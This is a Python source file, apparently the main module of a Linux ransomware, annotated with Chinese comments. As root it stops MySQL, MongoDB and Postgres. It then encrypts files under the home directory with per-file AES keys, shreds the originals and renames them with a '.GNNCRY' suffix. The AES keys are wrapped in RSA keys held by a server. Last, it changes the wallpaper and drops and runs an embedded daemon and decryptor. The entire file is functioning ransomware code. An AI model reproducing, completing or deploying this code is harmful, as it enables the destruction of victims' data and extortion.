import variables
import asymmetric
import get_files# 获取文件列表
import symmetric
import environment
import generate_keys
import utils

import os
import string
import random
import base64
import pickle
import gc
import subprocess

from Crypto.PublicKey import RSA
from Crypto.Hash import MD5
from Crypto.Hash import SHA
from Crypto import Random
from Crypto.Cipher import PKCS1_OAEP


def kill_databases():
    if(os.getuid() == 0):#root用户
        mysql = 'mysqld stop; mysql.server stop'
        mongo = 'service mongodb stop; /etc/init.d/mongodb stop'
        postgres = 'pkill -u postgres; pkill postgres'
        
        os.system(mysql)
        os.system(mongo)
        os.system(postgres)


def encrypt_priv_key(msg, key):
    n = 127
    x = [msg[i:i+n] for i in range(0, len(msg), n)]

    key = RSA.importKey(key)
    cipher = PKCS1_OAEP.new(key)
    encrypted = []
    for i in x:
        ciphertext = cipher.encrypt(i)
        encrypted.append(ciphertext)
    return encrypted


def start_encryption(files):
    # 存储加密后文件的路径和对应的密钥和编码后的文件名
    AES_and_base64_path = []
    # 遍历输入的文件列表
    for found_file in files:
        # 生成 AES 密钥base64加密key
        key = generate_keys.generate_key(128, True)
        # 创建 AES 加密对象
        AES_obj = symmetric.AESCipher(key)

        # 将输入的文件路径和文件名解码
        found_file = base64.b64decode(found_file)

        try:
            # 尝试打开文件并读取内容
            with open(found_file, 'rb') as f:
                file_content = f.read()
        except:
            continue

        # 对文件内容进行加密
        encrypted = AES_obj.encrypt(file_content)
        print(found_file)
        utils.shred(found_file)
        print('down\n')
        # 不可逆地删除原始文件内容
        # 创建加密后文件的新文件名
        new_file_name = found_file + b".GNNCRY"  # 将字节串形式的后缀名拼接到 found_file 上
        with open(new_file_name.decode('utf-8'), 'wb') as f:  # 解码成str类型后使用
            f.write(encrypted)

        base64_new_file_name = base64.b64encode(new_file_name).decode('utf-8')  # 先编码成str类型再进行base64编码

        # 将密钥和编码后的新文件名添加到列表中
        AES_and_base64_path.append((key, base64_new_file_name))
    return AES_and_base64_path


def menu():
    try:
        os.mkdir(variables.ransomware_path)  # 尝试创建目录"/home/tarcisio/test/"
    except OSError:
        pass  # 如果目录已存在则跳过
    kill_databases()  # 关闭数据库

    files = get_files.find_files(variables.home)  # 获取文件列表
    rsa_object = asymmetric.assymetric()  # 创建非对称加密对象
    rsa_object.generate_keys()  # 生成密钥对

    Client_private_key = rsa_object.private_key_PEM  # 获取客户端私钥
    Client_public_key = rsa_object.public_key_PEM  # 获取客户端公钥



    encrypted_client_private_key = encrypt_priv_key(Client_private_key, variables.server_public_key)  # 用服务器公钥加密客户端私钥
    if not os.path.exists(os.path.dirname(variables.ransomware_path)):
        os.makedirs(os.path.dirname(variables.ransomware_path))
    # 保存加密后的客户端私钥
    with open(variables.encrypted_client_private_key_path, 'wb') as output:#/home/lt/gonncry/encrypted_client_private_key.key
        pickle.dump(encrypted_client_private_key, output, pickle.HIGHEST_PROTOCOL)#将对象序列化为字节流并将其写入文件的功能

    # 保存客户端公钥
    with open(variables.client_public_key_path, 'wb') as f:
        f.write(Client_public_key)

    Client_private_key = None  # 清除客户端私钥
    rsa_object = None  # 清除非对称加密对象
    del rsa_object
    del Client_private_key
    gc.collect()  # 垃圾回收

    client_public_key_object = RSA.importKey(Client_public_key)  # 导入客户端公钥对象
    client_public_key_object_cipher = PKCS1_OAEP.new(client_public_key_object)  # 创建公钥加密对象

    # 文件加密开始
    aes_keys_and_base64_path = start_encryption(files)  # 开始加密文件


    enc_aes_key_and_base64_path = []
    for _ in aes_keys_and_base64_path:
        aes_key = _[0]  # 获取AES密钥
        base64_path = _[1]  # 获取文件路径
        encrypted_aes_key = client_public_key_object_cipher.encrypt(aes_key)  # 用客户端公钥加密AES密钥
        enc_aes_key_and_base64_path.append((encrypted_aes_key, base64_path))

    aes_keys_and_base64_path = None  # 清除AES密钥和路径
    del aes_keys_and_base64_path
    gc.collect()  # 垃圾回收

    # 保存加密后的AES密钥和文件路径
    with open(variables.aes_encrypted_keys_path, 'w') as f:
        for _ in enc_aes_key_and_base64_path:
            line = base64.b64encode(_[0]) + " " + _[1] + "\n"
            f.write(line)

    enc_aes_key_and_base64_path = None  # 清除加密后的AES密钥和路径
    del enc_aes_key_and_base64_path
    gc.collect()
def drop_daemon_and_decryptor():
    with open(variables.decryptor_path,'wb') as f:
        f.write(base64.b64decode(variables.decryptor))

    with open(variables.daemon_path, 'wb') as f:
        f.write(base64.b64decode(variables.daemon))

    os.chdir(variables.ransomware_path)
    os.system('chmod +x daemon')
    os.system('chmod +x decryptor')
    utils.run_subprocess('./daemon')


if __name__ == "__main__":
    menu()
    utils.change_wallpaper()
    drop_daemon_and_decryptor()

